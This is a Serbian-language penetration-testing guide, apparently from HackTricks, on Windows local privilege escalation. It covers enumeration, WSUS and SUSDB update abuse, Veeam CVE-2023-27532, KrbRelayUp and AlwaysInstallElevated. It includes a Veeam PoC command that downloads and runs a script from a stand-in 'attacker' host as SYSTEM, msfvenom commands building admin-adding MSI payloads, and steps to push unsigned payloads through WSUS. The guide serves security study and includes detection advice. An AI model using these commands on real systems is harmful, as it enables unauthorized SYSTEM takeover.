# Lokalno podizanje privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za lokalno podizanje privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za podizanje privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije zasniva se i na radionicama i kontrolnim listama zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o podizanju privilegija u Windows-u.<sup>[[5]](#references)</sup>

Za sažet pregled koristite [kontrolnu listu za lokalno podizanje privilegija](../checklist-windows-privilege-escalation.md).

## Osnove Windows-a

### Tokeni pristupa

**Ako ne znate šta su Windows tokeni pristupa, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

U Windows-u postoje različiti mehanizmi koji mogu **da vas spreče da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriju vaše aktivnosti**. Pre nego što započnete enumeraciju radi podizanja privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **odbrambene mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup takođe može da omogući da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac izmena memorije Windows procesa `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Zaštita administratora / tiho podizanje privilegija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL-a bez upita, ako se zaobiđu provere bezbedne putanje AppInfo-a. Ovde pogledajte poseban postupak za zaobilaženje UIAccess/Admin Protection-a:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Širenje promena u registru za pristupačnost na Secure Desktop-u može se zloupotrebiti za proizvoljan upis u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i putanju za **SMB arbitrary-port** LPE, pri kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

Za lokalni inventar iz postojeće PowerShell sesije pogledajte [enumeraciju Windows-a pomoću .NET-a](../basic-powershell-for-pentesters/dotnet-enumeration.md). Ovi primeri dopunjuju provere u nastavku, a da pritom ne pokreću zasebne izvršne datoteke za enumeraciju.

### Enumeracija informacija o verziji

Proverite da li verzija Windows-a ima poznate ranjivosti (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Eksploiti za određene verzije

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju Windows okruženje predstavlja.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventariše verziju OS-a, instalirana ažuriranja i odabrane potencijalno relevantne preporuke; pre nego što rezultat smatrate primenljivim, proverite tačan proizvod i ažuriranja koja su zamenila prethodna.

Za lokalni exploit specifičan za određenu verziju, proverite **arhitekturu procesa koji se izvršava**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [preusmeravanju sistema datoteka WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično razrešava u 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup nativnom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidat za nedostajući KB ne dokazuje da je sistem ranjiv; uporedite verziju koja se izvršava, instalirana ili novija zamenska ažuriranja, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

Primer korupcije memorije u servisu potražite u odeljku o [offsetima u kružnom baferu MIDI deljene memorije koje kontroliše klijent](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Objavljeni stack offseti važe samo za testiranu verziju; dobijanje privilegija `LOCAL SERVICE` razlikuje se od kasnijeg koraka [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) za dobijanje privilegija `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki credential/Juicy podaci sačuvani u env promenljivama?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Datoteka [PowerShell profile](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) u koju može da se upisuje predstavlja zaseban trag za izvršavanje pri pokretanju; proverite da li korisnik sa višim privilegijama zaista učitava taj profil pre nego što to smatrate eskalacijom.

### PowerShell transcript datoteke

Kako da ovo uključite možete saznati na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje datoteke u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili komanda `Start-Transcript -OutputDirectory` može da ih preusmeri u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu izlaznu putanju i ACL datoteke: ona može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript kojem možete da pristupite predstavlja koristan trag samo ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u odgovarajućem kontekstu.

### Evidentiranje modula u PowerShell-u

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja ni rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files” dokumentacije i izaberite **„Module Logging”** umesto **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete da izvršite:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i sav sadržaj izvršavanja skripte, čime se obezbeđuje dokumentovanje svakog bloka koda dok se izvršava. Ovim postupkom čuva se sveobuhvatan revizijski trag svake aktivnosti, vredan za forenzičku analizu i ispitivanje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti tokom izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaje za Script Block možete pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete da koristite:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Raniji saveti su rizik saželi na sledeći način:

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju preko http**S**, već preko http.

HTTP WSUS endpoint je signal za proveru mogućeg presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne potvrđuje mogućnost izvršavanja koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranje bez SSL-a tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor kao što je neki od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je vrednost `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednaka `1`.

Originalna izjava o primenljivosti glasila je:

Tada je **moguće iskoristiti ranjivost.** Ako je vrednost poslednjeg ključa registratora `0`, unos WSUS-a će biti zanemaren.

Kada je `UseWUServer` podešen na `1`, Windows Update koristi konfigurisanu intranet uslugu. To potvrđuje jedan preduslov za putanju presretanja HTTP saobraćaja, ali ne dokazuje da je presretanje, prihvatanje zlonamernih ažuriranja ili instalacija sa povišenim privilegijama moguća. Kada je podešen na `0`, ta konkretna WSUS krajnja tačka nije izabrana ovom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su skripte za MiTM eksploataciju, pripremljene za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je propust koji ova greška iskorišćava:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima programa Internet Explorer, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako napravimo samopotpisani sertifikat za WSUS ime hosta i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme nalik HSTS-u za primenu provere poverenja pri prvom korišćenju sertifikata. Ako korisnik veruje prikazanom sertifikatu i on ima ispravno ime hosta, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi servera `WSUS Administrators` i sve delegirane WSUS dozvole, a zatim utvrdite koja grupa klijenata računara bi primila odobreno ažuriranje. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom eskalacije privilegija, potvrdite da je predloženo ažuriranje potpisano i prihvaćeno, da se odnosi na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju da su ti uslovi ispunjeni.

### Zloupotreba prilagođenih ažuriranja SUSDB: nepotpisani payload-i preko `.txt`/`.esd`

Ovo je drugačiji propust granice poverenja od presretanja WSUS veze preko HTTP-a: preduslov je dovoljan pristup **uskladištenim procedurama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način pristupa jeste prosleđivanje naloga WSUS računara koji komunicira sa uzvodnim serverom do zasebnog MSSQL servera na kom se nalazi `SUSDB`; konkretni preduslovi zavise od postavki, zato prvo izlistajte dozvole `EXECUTE`, umesto da pretpostavljate da su potrebna SQL administratorska prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje WSUS klijentsku autentifikaciju sa HTTP/8530 na LDAP, SMB ili AD CS pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Provera relay-a ka eksternoj bazi podataka i dozvola za procedure

U postavkama gde WSUS koristi eksterni SQL Server, prvo proverite da li nalog WSUS servera može da se autentifikuje na bazi podataka i da li NTLM relay stiže do tog listener-a. SQL uloga servera može da omogući pristup procedurama za objavljivanje ažuriranja čak i kada su direktni upisi u tabele zabranjeni; neuspešan `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje onemogućeno. Pre pokušaja objavljivanja prilagođenog ažuriranja, proverite efektivni identitet, članstvo u ulogama i dozvole za procedure u ovlašćеној SQL sesiji.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicije procedura uživo i instalirani `SoftwareDistributionPackage.xsd` korisni su za rekonstrukciju važećih metapodataka ažuriranja. Roditeljski bundle i dete koje sadrži payload moraju svaki da imaju `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vrati svaki poziv `spImportUpdate` i održavajte doslednost odnosa između bundle-a, digest vrednosti, veličine, URL-a sadržaja i revizije. Ovo je stateful tok objavljivanja, pa jedan uspešan poziv uskladištene procedure nije dokaz izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Napravite, ciljajte i odobrite ažuriranje

Tok rada za prilagođena ažuriranja koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važne promene stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvezite metapodatke ažuriranja | `spImportUpdate` |
| Sačuvajte XML fragmente preduslova, lokalizovanih i proširenih svojstava | `spSaveXMLFragment` |
| Povežite digest sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Prikažite/nabrojte ili napravite grupu računara i dodajte klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobrite instalaciju za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, digest vrednosti, veličina i rukovalac `CommandLineInstallation` moraju da budu usklađeni u uvezenim metapodacima/fragmentima. Nakon dodele URL-a sadržaja i ciljne grupe, završno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i primene umesto ponovne upotrebe GUID-ova iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS obično odbija proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE fajl nazvan, na primer, `payload.exe.txt`, može proći proveru sadržaja, a zatim ga može pokrenuti rukovalac za instalaciju ažuriranja iz komandne linije. Ovo je greška policy/type-confusion, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno postavljanje i automatizacija

Poziv funkcije `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvorni server mora da ispunjava HTTP zahteve BITS-a: dostupna URL adresa nije dovoljna jer prenos koristi početni niz zahteva `HEAD`/`GET` i zahteve za opsege bajtova. Server bez podrške za Range protokol izaziva WSUS događaj sinhronizacije `EventId=364`, koji navodi da BITS zahteva zaglavlje Range protokola.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalna komanda za ovlašćeno laboratorijsko okruženje je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Neinteraktivno izvršavanje i postojanost pri ponovnim pokušajima

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, korisniku je ponovo odmah ponuđen payload čije ažuriranje nije uspelo ili je ostalo nedovršeno, čim se proces callback-a završio, pa ponašanje pri ponovnim pokušajima može postati postojanost kroz ponavljano izvršavanje; pritom je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Pravci za detekciju i ojačavanje zaštite

Korisni pravci za proveru na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Proverite izvršavanje procedura `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payload-e ažuriranja `.txt`/`.esd` i instalacije koje izvršavaju neočekivani nalozi (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` i potražite `ContentSyncAgent`, `FileVerified`, pogrešno napisano `FileVerficationFailed` i `EventId=364`; povežite proveru sa ekstenzijom payload-a i potpisom sadržaja, umesto da verujete ekstenziji.
- Tražite ponavljane neuspehe i ponovne pokušaje instalacije Windows Update-a, kao i izvršavanje PE datoteka ili neočekivanu aktivnost podređenih procesa/mreže kod sadržaja sa nazivima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication za servis baze podataka gde je podržan i ograničite mrežni pristup bazi na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na minimum i nadgledajte ih.

## Alati za automatsko ažuriranje trećih strana i Agent IPC (lokalni privesc)

Mnogi poslovni agenti izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako se registracija može preusmeriti na server napadača, a alat za ažuriranje veruje lažnom root CA sertifikatu ili koristi slabe provere potpisnika, lokalni korisnik može isporučiti zlonamerni MSI koji SYSTEM servis instalira. Ovde pogledajte uopštenu tehniku (zasnovanu na lancu Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Prvobitni opis za određene verzije i napomena za izviđanje bili su:

Veeam B&R < `11.0.1.1261` izlaže lokalni servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, što omogućava izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: potvrdite da port sluša i proverite verziju, npr. pomoću `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni servis za rezervne kopije na portu **TCP/9401**. [Veeam-ovo obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka za konfiguraciju unutar mrežnog perimetra za rezervne kopije; zaseban javni PoC pokazuje putanju za izvršavanje komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može biti vezan za adresu koja nije samo localhost, zato proverite njegovu stvarnu adresu i PID.

- **Recon**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` predstavljaju indikatore, a ne potpunu proveru zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; prethodna izdanja su pogođena. Četvorodelna verzija datoteke sama po sebi ne može da razlikuje nezakrpljenu osnovnu verziju od kasnije zakrpe na istom broju build-a. Pre nego što build na granici verzija proglasite ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Exploit**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog soketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Navedeni PoC prikazuje izvršavanje komande kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.

## KrbRelayUp

Originalni opis podrazumevanog okruženja glasio je:

U Windows okruženjima **domena** postoji ranjivost **lokalne eskalacije privilegija** pod određenim uslovima. Ti uslovi obuhvataju okruženja u kojima **LDAP signing nije nametnut,** korisnici imaju prava nad sopstvenim objektima koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i mogu da kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni pomoću **podrazumevanih podešavanja**.

Lokalni Kerberos relay može da premosti razliku između prijave sa nižim privilegijama i privilegisanog upisa u direktorijum kada se odgovarajući COM server autentifikuje, a relay-ovani principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) i LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuća prava za delegiranje i nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis ključa i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedna putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za relay-ovani identitet i nivoe autentifikacije i impersonation-a izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Rutiranje kroz firewall/OXID i instalirana ažuriranja takođe mogu da promene rezultat. Permisivnu smernicu ili odgovarajući ACL tretirajte kao nešto što treba pregledati; pasivno nabrajanje ne bi trebalo da pokrene COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential računarskog naloga može da dovede do računarskog ticket-a, a samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, i do zasebne DCSync putanje.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) datoteke `*.msi` kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

